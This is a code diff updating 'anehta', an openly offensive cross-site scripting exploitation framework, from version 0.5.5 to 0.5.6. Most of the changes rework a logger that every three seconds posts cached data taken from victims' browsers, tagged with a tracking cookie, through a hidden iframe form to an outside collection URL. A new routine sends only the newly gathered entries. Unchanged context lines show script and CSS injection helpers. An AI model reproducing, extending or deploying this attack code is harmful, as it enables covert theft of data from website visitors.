@@ -4,13 +4,14 @@
 //// 定义常量
 //////////////////////////////////////////////////
 var anehta = {
-        Version: '0.5.5',
+        Version: '0.5.6',
         Author: 'axis',
         Contact: 'axis@ph4nt0m.org',
         Homepage: 'http://www.ph4nt0m.org',
         Blog: 'http://hi.baidu.com/aullik5',
         projectHome: 'http://anehta.googlecode.com',
-        DemoPage: 'http://www.secwiki.com/anehta/demo.html'};
+        DemoPage: 'http://www.secwiki.com/anehta/demo.html'  
+};
 
 var anehtaurl = "http://www.a.com/anehta";
 var feedurl = anehtaurl+"/feed.js";
@@ -526,7 +527,7 @@ anehta.net.postForm = function(url){
 
 // 向隐藏iframe提交表单
 //ifr 为iframe对象,由	ifr = anehta.inject.addIframe(""); 创建
-anehta.net.postFormIntoIframe = function(url, postdata, ifr){	
+anehta.net.postFormIntoIframe = function(ifr, url, postdata){	
 	// 创建form
 	var f;
 	f=document.createElement('form');	
@@ -649,7 +650,7 @@ anehta.logger.logForm = function(o) {
 
 // 定期检查client cache,并把其中的信息发送到server
 anehta.logger.logCache = function(){
-	var interval = 5000; // 检查的频率
+	var interval = 3000; // 检查的频率
 	var cache_tmp = "";
 	//alert(1);
 	//需要加载一个定制的iframe
@@ -664,6 +665,7 @@ anehta.logger.logCache = function(){
 		// 正常记录cache里数据
 		var keys = anehtaCache.showKeys();
 	    if (keys != null){ // cache里有东西
+
 	    	var cache = "";
 		    for (i=0; i<keys.length; i++) {
 		     	if (anehtaCache.hasItem(keys[i]) == true){
@@ -673,19 +675,52 @@ anehta.logger.logCache = function(){
 		    //alert(cache_tmp);
 		    if(cache != cache_tmp){ // 有变化才发送,没有变化不发送
 		    //if(cache != ""){ // 有记录才发送,没有记录不发送
-		    	try {
-		    		
-		    		cache_tmp = cache; // 把当前cache保存在cache_tmp 中
+		    	try {		    		
 		    		// 如果cache太长会导致请求失败
 		        //anehta.logger.logInfo(cache); 
-		        
-		        // 所以使用post发送数据
-		        cache = NoCryptMark + XssInfo_S + "Watermark: " + anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
+
+		        if (cache_tmp == ""){ // 起初cache_tmp为空，将cache里的数据全部发送出去
+		        	cache_tmp = cache; // 先把当前cache保存在cache_tmp 中
+		        	
+		        	cache = NoCryptMark + XssInfo_S + "Watermark: " + 
+		                anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
                     XssInfo_S + "Info: " + cache + XssInfo_E;
-	          cache = escape(cache);
-		        anehta.net.postFormIntoIframe(logurl, cache, ifr);
-		        
-		        //anehtaCache.clear(); 		        
+	            cache = escape(cache);
+		          anehta.net.postFormIntoIframe(ifr, logurl, cache);
+		        }
+		        else {
+		          var c_tmp = cache_tmp.split(XssInfo_E);
+		          var c = cache.split(XssInfo_E);
+		          var sendDiff = "";
+		          var flag = 0; //通过这个标志判断是否找到
+		          
+		          for (i=0; i < c.length; i++){
+		          	for (j=0; j < c_tmp.length; j++){
+		          	  if (c_tmp[j] == c[i]){ // 找到了, 没差异,跳过继续找
+		          	  	flag = 1;
+		          		  break;
+		          	  }      
+		            }
+		            
+		            if ( flag == 1){
+		            	flag = 0;
+		              continue;
+		            } else {
+		            // 没找到，记下来，准备发送                
+                  sendDiff = sendDiff + c[i] + XssInfo_E; // 还原信息头
+                  //alert("senddiff: "+sendDiff);
+                }
+		          }
+		          
+		          // 只发送差异部分
+		          sendDiff = NoCryptMark + XssInfo_S + "Watermark: " + 
+		                     anehta.dom.getCookie("anehtaWatermark") + XssInfo_E +
+                         XssInfo_S + "Info: " + sendDiff + XssInfo_E;
+              sendDiff = escape(sendDiff);
+		          anehta.net.postFormIntoIframe(ifr, logurl, sendDiff);
+		          
+		          cache_tmp = cache; // 把当前cache保存在cache_tmp 中
+		        }        
 		      } catch (e) {
 		      	//alert(e);
 		      }
@@ -916,7 +951,7 @@ anehta.inject.removeScript = function(s){
 }
 
 anehta.inject.addScript = function(ptr_sc){
-  document.write("<script src='"+ptr_sc+"'></script>");
+	document.write("<script src='"+ptr_sc+"'></script>");
 }
 
 anehta.inject.injectCSS = function(ptr_sc){
@@ -1286,6 +1321,11 @@ anehta.detect.flash = function(targetVersion){
 
 anehta.detect.java = function(){
 
+}
+
+
+anehta.detect.silverlight = function(){
+	
 }
 
 anehta.detect.internalIP = function(){
